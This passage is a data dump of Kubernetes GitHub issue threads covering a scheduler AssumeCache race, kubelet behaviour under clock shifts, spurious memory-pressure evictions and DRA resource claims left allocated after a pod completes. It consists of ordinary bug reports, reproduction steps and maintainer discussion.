applicable)\n>\n><details>\n>\n></details>\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pohly", "body": "/sig api-machinery\n"}, {"author": "liggitt", "body": "fix in https://github.com/kubernetes/kubernetes/pull/134379"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133872, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133872", "issue_title": "AssumeCache may detect the PersistentVolume update later than the scheduler's event handlers", "issue_author": "macsko", "issue_body": "### What happened?\n\nLet's say we have a scenario where Pod is rejected waiting for a PersistentVolume to be available.\nWhen the PersistentVolume status is updated to `Available`, the scheduler is notified via event handlers.\n\nOne of such handlers, in [eventhandling.go](https://github.com/kubernetes/kubernetes/blob/18c188467d8ae00042b61f82aa159094336b657e/pkg/scheduler/eventhandlers.go#L566) is responsible for triggering the Pod's scheduling retry. In this case, the reason is valid, so the Pod is placed in the activeQ (or backoffQ) and then taken to the scheduling.\n\nHowever, during the (pre)filtering of VolumeBinding plugin, the PersistentVolume objects are [listed](https://github.com/kubernetes/kubernetes/blob/18c188467d8ae00042b61f82aa159094336b657e/pkg/scheduler/framework/plugins/volumebinding/binder.go#L825) from the plugin's AssumeCache, which have its own set of the [event handlers](https://github.com/kubernetes/kubernetes/blob/18c188467d8ae00042b61f82aa159094336b657e/pkg/scheduler/util/assumecache/assume_cache.go#L208-L214). If these handlers receive the PV update event later than the main scheduler's handlers, VolumeBinding takes the decision based on an old data, e.g. a PersistentVolume with an old state. As a result, the Pod is [rejected](https://github.com/kubernetes/kubernetes/blob/18c188467d8ae00042b61f82aa159094336b657e/pkg/scheduler/framework/plugins/volumebinding/binder.go#L885) and goes back to the scheduling queue.\n\nUltimately, there won't be any event that would wake up such Pod again, so it will wait indefinitely (precisely, it will be retried by the flushing mechanism that we would like to eventually remove).\n\nThis behavior causes the `volumescheduling` integration test to flake: https://testgrid.k8s.io/sig-release-master-blocking#integration-master\n\n/sig scheduling\n/sig storage\n/kind flake\n\n### What did you expect to happen?\n\nVolumeBinding should have a consistent view of PersistentVolumes with the main scheduler's event handlers.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRun the integration tests with low parallelism:\n```sh\nKUBE_INTEGRATION_TEST_MAX_CONCURRENCY=2 make test-integration WHAT=\"test/integration/volumescheduling\" KUBE_TEST_ARGS=\"-run TestVolumeBindingRescheduling\"\n```\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/scheduling", "sig/storage", "kind/flake", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "macsko", "body": "cc: @sanposhiho @dom4ha "}, {"author": "pohly", "body": "Corresponding flake issue: https://github.com/kubernetes/kubernetes/issues/133611\n"}, {"author": "pohly", "body": "The fix for this should be what I did for DRA: react to events provided by the assume cache instead of the underlying informer. That functionality didn't exist in the assume cache when it was added for volumes, but it is there now for exactly this purpose.\n\n"}, {"author": "huww98", "body": "For the fix, I propose that instead of listening for update event in AssumeCache and update a secondary cache, we just read the PV from informer cache directly and exclude the ones that is already bound by scheduler.\n\nCompared to the fix proposed by @pohly , I think my proposal would make the overall system complexity lower. We don't need the scheduler framework to be aware of our assume cache. And we reduce one level of asynchronous and one level of cache store.\n\nAnd as written in the comment of Assume()\nhttps://github.com/kubernetes/kubernetes/blob/ef4add4509a479dab1f34369dacb7e65a3fa2e81/pkg/scheduler/util/assumecache/assume_cache.go#L425-L426\nOur current usage is unsafe actually. We may take the chance to also fix this."}, {"author": "msau42", "body": "I am ok with the approach in `Get()` to read from the cache and compare directly with the informer, instead of copying the informer object into the cache."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134153, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134153", "issue_title": "[kubelet] time shift and `failed to reserve container name`", "issue_author": "borg-z", "issue_body": "### What happened?\n\nAfter a liveness failure the kubelet tried to restart the container `test-container`. The node clock stepped backwards about 40 seconds at the same moment. Because `podWorkerLoop` calls `podCache.GetNewerThan(podUID, lastSyncTime)`, the cached pod status never looked newer than the saved `lastSyncTime`. The kubelet kept the old `RestartCount`, called `CreateContainer` again with attempt `1`, and containerd returned:\n\n```\nfailed to reserve container name \"test-container_test-container-68b789996c-q9kxh_d8-cloud-instance-manager_fe9ba7d1-5308-44ef-a81c-83133bf88c50_1\": name ... is reserved for \"d553f9f992855e898c29b05b6487da56580ab760db155bfd90da20e8fe8a98bc\"\n```\n\n### What did you expect to happen?\n\n\nEven if the node clock jumps backwards, kubelet should notice that the previous container already exists and should wait for a fresh pod status before calling `CreateContainer` again. The restart attempt should be `2`, not `1`, so containerd does not reject the request\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1. Run Kubernetes v1.31.10 with containerd on a test node.\n2. Deploy any pod that continuously crashes (e.g. fails liveness probe so it loops in `CrashLoopBackOff`).\n3. On the same node run:\n\n```bash\nwhile true\ndo\n     sudo date -s \"+10 minutes\"\n     sleep 1\n     sudo date -s \"-10 minutes\"\n     sleep 1\ndone\n ```\n\n4. Watch kubelet and containerd logs. After several restarts you will see kubelet making a second `CreateContainer` call with attempt `1`, followed by containerd logging `failed to reserve container name`.\n\n### Anything else we need to know?\n\n```\nI0918 16:09:49.994636     550 kuberuntime_container.go:808] \"Killing container with a grace period\" pod=\"d8-cloud-instance-manager/bashible-apiserver-68b789996c-q9kxh\" containerID=\"containerd://c42fbc64c45cd657eeaceee5c2326f3e64057d551d9340629670487c0247e0c5\"\nE0918 16:08:41.636161     550 log.go:32] \"CreateContainer in sandbox from runtime service failed\" err=\"rpc error: code = Unknown desc = failed to reserve container name ...\"\n```\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.31.0\nServer Version: v1.31.10\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\ncontainerd 1.7.x\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/node", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "borg-z", "body": "/sig node"}, {"author": "haircommander", "body": "I believe SIG Node's stance is a time shift while the kubelet is running has undefined behavior. I believe there are other things that can go wrong and I don't personally want to commit to squashing every bug there. Also: we should be careful about updating the PLEG code, it's delicate \ud83d\ude42 \n"}, {"author": "borg-z", "body": "I understand your concerns, but at the moment we have an unpleasant, although rare, problem. Pods in this state freeze in an undefined state and can only be fixed by manual removal. If it is impossible to fix the problem itself, is there any way to deal with the consequences?"}, {"author": "SergeyKanzhelev", "body": "@borg-z do you have a good means to sync time more proactively and not wait for 40 seconds drift? As @haircommander mentioned, general stance is the kubelet is not supporting time shifts.\n\n/close"}, {"author": "k8s-ci-robot", "body": "@SergeyKanzhelev: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134153#issuecomment-3357446366):\n\n>@borg-z do you have a good means to sync time more proactively and not wait for 40 seconds drift? As @haircommander mentioned, general stance is the kubelet is not supporting time shifts.\n>\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "borg-z", "body": "Thank you for the answer. As I mentioned, if fixing the underlying issue is not an option, perhaps we could at least mitigate the effect. Currently, the Pod remains in a stuck state, and manual deletion is required. Could kubelet handle this automatically via restartPolicy?"}, {"author": "SergeyKanzhelev", "body": "> Could kubelet handle this automatically via restartPolicy?\n\nif you have a specific proposal on what needs to be done, please reopen the issue. Since kubelet and container runtime both can be very confused with the time shift, the right way fixing thing will be just restart both."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 114332, "issue_url": "https://github.com/kubernetes/kubernetes/issues/114332", "issue_title": "(usage - inactive file) greater than capacity causing eviction", "issue_author": "pacoxu", "issue_body": "### What happened?\r\n\r\n/sig node\r\n\r\n`free` shows the total memory is 32Gi and used only 6Gi.\r\nFree is 12Gi\r\nShared 1.6Gi\r\nbuff/cache 13Gi\r\navailable 19Gi\r\n\r\n4.19.90-23.8.v2101.ky10.aarch64 \r\n- https://kubernetes.io/examples/admin/resource/memory-available.sh This is a script to calculate memory.available from https://kubernetes.io/docs/concepts/scheduling-eviction/node-pressure-eviction/\r\n\r\n```\r\nmemory.capacity_in_bytes   32879017984 (~32Gi)\r\nmemory.usage_in_bytes       80342220800 (~80Gi)\r\nmemory.total_inactive_file    10048962560 (~10Gi)\r\nmemory.working_set             70293258240 (~70Gi)\r\nmemory.available_in_bytes -37414240256 (-35Gi)\r\nmemory.available_in_kb      -36537344\r\nmemory.available_in_mb     -35681\r\n```\r\n\r\n- workingset memory(70Gi) = memory.usage_in_bytes(80Gi) - inactive file (10Gi)\r\n- - this will be including active file memory\r\n- availabel = capacity (32Gi) - working set memory(70Gi)  = - 38Gi < 0\r\n\r\nWith the script, we got a negative value available in bytes which is obviously a bug of the operation system Kylin. \r\n\r\n### What did you expect to happen?\r\n\r\nNo eviction if the problem is that memory.usage_in_bytes greater than memory.capacity_in_byte.\r\n\r\nBefore the OS fixes the bug, can kubelet stop evicting pods when `usage_in_bytes` is not properly set? fixes\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nYes.\r\n\r\nAnd the workaround is to drop cache and the usage_in_bytes and active file/inactive file will become correct.\r\n\r\n\r\n### Anything else we need to know?\r\n\r\n**Eviction is so dangerous if the condition checking is based on wrong data.**\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\n$ kubectl version\r\n1.23\r\n```\r\n\r\n</details>\r\n\r\n1.25 as well\r\n\r\n### Cloud provider\r\n\r\n<details>\r\nvsphere\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n4.19.90-23.8.v2101.ky10.aarch64 \r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\nkubeadm\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\ndocker \r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\ncalico\r\n</details>\r\n", "issue_labels": ["kind/bug", "priority/backlog", "sig/node", "needs-triage"], "comments": [{"author": "Bryce-Soghigian", "body": "```\r\n> What did you expect to happen?\r\n> No eviction if the problem is that memory.usage_in_bytes greater than memory.capacity_in_byte.\r\n> \r\n> Before the OS fix the bug, can kubelet stop evicting pods when usage_in_bytes is not properly set? fixes\r\n```\r\n\r\nI agree that this should be the expected behavior and we should have a case for it. This raises a more interesting question however, how often we are seeing memory-usage_in_bytes greater than capacity? What is causing this behavior? Thats the thing I think we should focus on.\r\n\r\nWas it just the OS bug that raised a red flag to you?"}, {"author": "SergeyKanzhelev", "body": "> Was it just the OS bug that raised a red flag to you?\r\n\r\n+1 to this question"}, {"author": "SergeyKanzhelev", "body": "/triage needs-information"}, {"author": "pacoxu", "body": "> I agree that this should be the expected behavior and we should have a case for it. This raises a more interesting question however, how often we are seeing memory-usage_in_bytes greater than capacity? What is causing this behavior? Thats the thing I think we should focus on.\r\n\r\nThis happened in our customer's cluster and after we add crontab to `echo 3 > /proc/sys/vm/drop_caches` every midnight, the problem is not that suffered now. But we want to avoid similar cases in other clusters as well.\r\n\r\n> Was it just the OS bug that raised a red flag to you?\r\n\r\nI need to check with the Kylin community but I think this may cost a long period as we did before.\r\nThat's why I want to fix it in kubelet as some bad input from OS and avoid eviction as eviction is so dangerous for us.\r\n"}, {"author": "aimuz", "body": "Is it related to this?\r\n\r\nhttps://github.com/kubernetes/kubernetes/issues/114142\r\n\r\n"}, {"author": "pacoxu", "body": "> Is it related to this?\r\n> \r\n> #114142\r\n\r\nThe memory usage is including active file memory. \r\n\r\nhttps://kubernetes.io/docs/concepts/scheduling-eviction/node-pressure-eviction/#active-file-memory-is-not-considered-as-available-memory\r\n\r\nThe node `/sys/fs/cgroup/memory/memory.usage_in_bytes` is almost 80Gi which is much greater than the node memory total 32Gi. \r\n"}, {"author": "pacoxu", "body": "> https://kubernetes.io/docs/concepts/scheduling-eviction/node-pressure-eviction/#active-file-memory-is-not-considered-as-available-memory\r\n\r\n@SergeyKanzhelev @Bryce-Soghigian \r\nDo you think this is the known issue as the link above? Node is taking active file as no reclaimable memory."}, {"author": "Bryce-Soghigian", "body": "Regardless if this was caused by active file or not I think we should get back to discussing the initial question of this issue which is, What is the expected eviction behavior if the usage_bytes || working_set_bytes exceed the capacity_bytes. \r\n\r\ni think that if the usage_bytes > capacity then there is some bug in the underlaying os that exposes the `memoryStats` info. So we should not evict based on this but make sure to raise errors of some kind and alert the owner of the cluster on the issue. \r\n\r\nThat is my two cents."}, {"author": "pacoxu", "body": "> i think that if the usage_bytes > capacity then there is some bug in the underlaying os that exposes the `memoryStats` info. So we should not evict based on this but make sure to raise errors of some kind and alert the owner of the cluster on the issue.\r\n\r\nAgree. \r\n- The `usage_bytes > capacity` should be OS bug and we will report it to the OS team.\r\n- For such scenario, kubelet should not evict pod when detecting such a bad situation. That is what I tried to fix in  https://github.com/kubernetes/kubernetes/pull/114333"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "pacoxu", "body": "/remove-lifecycle stale"}, {"author": "potatoxz14", "body": "Does the OS team figure out why the **usage_bytes** > **capacity**?"}, {"author": "pacoxu", "body": "> Does the OS team figure out why the **usage_bytes** > **capacity**?\r\n\r\nWe think this is a bug in the OS layer but get no feedback yet. However, we have some clusters that are running on that OS, that is why I opened https://github.com/kubernetes/kubernetes/pull/114333 to fix it in kubelet side. The PR is not approved yet."}, {"author": "kuangxiaoying", "body": "Maybe k8s should not use usage_in_bytes because it's a fuzz value. See in https://www.kernel.org/doc/Documentation/cgroup-v1/memory.txt\r\n\r\n5.5 usage_in_bytes\r\n\r\nFor efficiency, as other kernel components, memory cgroup uses some optimization\r\nto avoid unnecessary cacheline false sharing. usage_in_bytes is affected by the\r\nmethod and doesn't show 'exact' value of memory (and swap) usage, it's a fuzz\r\nvalue for efficient access. (Of course, when necessary, it's synchronized.)\r\nIf you want to know more exact memory usage, you should use RSS+CACHE(+SWAP)\r\nvalue in memory.stat(see 5.2).\r\n\r\n\r\n"}, {"author": "pacoxu", "body": "/assign\r\nas I opened https://github.com/kubernetes/kubernetes/pull/114333."}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "pacoxu", "body": "/remove-lifecycle rotten\r\nSome update from @wenjiaswe  https://github.com/kubernetes/kubernetes/pull/114333#issuecomment-1983098457\r\n\r\n> The kernel maybe very lazy to sync memory usage counters of the root cgroup. Lots of dying cgroups make usage_in_bytes greater than capacity_in_bytes. See [torvalds/linux@c350a99](https://github.com/torvalds/linux/commit/c350a99ea2b1b666c28948d74ab46c16913c28a7)\r\n> \r\n> `echo 3 > /proc/sys/vm/drop_caches` is a quick and dirty workaround.\r\n> \r\n> We fixed the issue by:\r\n> \r\n> 1. backport [torvalds/linux@f82a7a8](https://github.com/torvalds/linux/commit/f82a7a86dbfbd0ee81a4907ca41ba78bda1846f4)\r\n> 2. find out the source of dying cgroups with the help of [drgn](https://github.com/osandov/drgn/pull/306) and fix it\r\n\r\nThis makes the bug possible in a general linux kernel."}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/114332#issuecomment-2267497359):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@pacoxu: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/114332#issuecomment-2362560321):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "SergeyKanzhelev", "body": "/remove-lifecycle rotten\r\n/remove-triage needs-information\r\n\r\nLeaving it for the triage meeting to understand the priority, now just fixing labels"}, {"author": "AnishShah", "body": "sig-node CI triage meeting:\r\n\r\n@pacoxu are you still working on this?\r\n\r\n/remove-triage needs-information\r\n/triage accepted\r\n/priority backlog"}, {"author": "k8s-ci-robot", "body": "@AnishShah: Those labels are not set on the issue: `triage/needs-information`\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/114332#issuecomment-2374761254):\n\n>sig-node CI triage meeting:\r\n>\r\n>@pacoxu are you still working on this?\r\n>\r\n>/remove-triage needs-information\r\n>/triage accepted\r\n>/priority backlog\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "pacoxu", "body": "> sig-node CI triage meeting:\r\n> \r\n> @pacoxu are you still working on this?\r\n\r\n> https://github.com/torvalds/linux/commit/f82a7a86dbfbd0ee81a4907ca41ba78bda1846f4\r\n\r\nhttps://github.com/kubernetes/kubernetes/pull/114333#issuecomment-1983098457 shows that this may be a problem if the kernel is with the kernel bug that is mentioned here. "}, {"author": "SergeyKanzhelev", "body": "> > sig-node CI triage meeting:\r\n> > @pacoxu are you still working on this?\r\n> \r\n> > [torvalds/linux@f82a7a8](https://github.com/torvalds/linux/commit/f82a7a86dbfbd0ee81a4907ca41ba78bda1846f4)\r\n> \r\n> [#114333 (comment)](https://github.com/kubernetes/kubernetes/pull/114333#issuecomment-1983098457) shows that this may be a problem if the kernel is with the kernel bug that is mentioned here.\r\n\r\nDo you think there is anything else we need to do here than? Or should we just close it?"}, {"author": "pacoxu", "body": "> > > sig-node CI triage meeting:\r\n> > > @pacoxu are you still working on this?\r\n> > \r\n> > \r\n> > > [torvalds/linux@f82a7a8](https://github.com/torvalds/linux/commit/f82a7a86dbfbd0ee81a4907ca41ba78bda1846f4)\r\n> > \r\n> > \r\n> > [#114333 (comment)](https://github.com/kubernetes/kubernetes/pull/114333#issuecomment-1983098457) shows that this may be a problem if the kernel is with the kernel bug that is mentioned here.\r\n> \r\n> Do you think there is anything else we need to do here than? Or should we just close it?\r\n\r\nI think the fix  https://github.com/kubernetes/kubernetes/pull/114333/ has no side effect and can fix this if user is using a problematic OS.\r\n\r\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134311, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134311", "issue_title": "resource claims created by scheduler for extended resources are not de-allocated when pod is completed", "issue_author": "alaypatel07", "issue_body": "### What happened?\n\n1. create kind 1.34 cluster with `DRAExtendedResource: true` feature flag\n2. install the dra-example-driver: https://github.com/kubernetes-sigs/dra-example-driver\n3. update the dra-example-driver device class to have `spec.extendedResourceName` set to `example.com/gpu`\n4. create a pod with extended resources style access to a fake example.com/gpu\n   ```\n      $ cat <<EOF | kubectl apply -f -\n      apiVersion: v1\n      kind: Pod\n      metadata:\n        name: test-extended-resource-pod\n        namespace: default\n      spec:\n        restartPolicy: Never\n        containers:\n        - name: test-container\n          image: busybox:1.35\n          command: [\"/bin/sh\"]\n          args: [\"-c\", \"echo 'Pod started with extended resource'; sleep 3; echo 'Pod completed successfully'\"]\n          resources:\n            requests:\n              example.com/gpu: 1\n            limits:\n              example.com/gpu: 1\n      EOF\n   ```\n5.  After the pod completes, the resource claim for it should go through de-allocation, instead it just stayed there\n   ```\n    # k get pods,resourceclaims\n    NAME                             READY   STATUS      RESTARTS   AGE\n    pod/test-extended-resource-pod   0/1     Completed   0          5m44s\n    \n    NAME                                                                                STATE                AGE\n    resourceclaim.resource.k8s.io/test-extended-resource-pod-extended-resources-skdsf   allocated,reserved   5m11s\n   ```\n\n### What did you expect to happen?\n\nIt is expected that the resource claims should be de-allocated when pods are in terminal state\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nAll the steps of reproducing it is documented in aboce section\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.32.2\nKustomize Version: v5.5.0\nServer Version: v1.34.0\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nkind\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-triage", "wg/device-management"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "alaypatel07", "body": "cc @klueska @johnbelamaric "}, {"author": "pohly", "body": "/wg device-management\n"}, {"author": "yliaog", "body": "if you manually delete only the completed pod, will the resource claim go away?\n\nit should, as the claim has an owner reference to the pod, when pod is deleted, the claim is also deleted."}, {"author": "alaypatel07", "body": "> if you manually delete only the completed pod, will the resource claim go away?\n\n> it should, as the claim has an owner reference to the pod, when pod is deleted, the claim is also deleted.\n\nThis is true, however, the distinction this issue captures is a pod present in API in completed state. For the DRA Structured Parameters feature, if a pod with resource claim is in completed state, the claim is automatically delated so that device is freed up for other pods to use.  This distinction is important for the perf-scale test workloads and the issues blocks https://github.com/kubernetes/kubernetes/issues/133757\n"}, {"author": "yliaog", "body": "ok, that makes sense."}]}
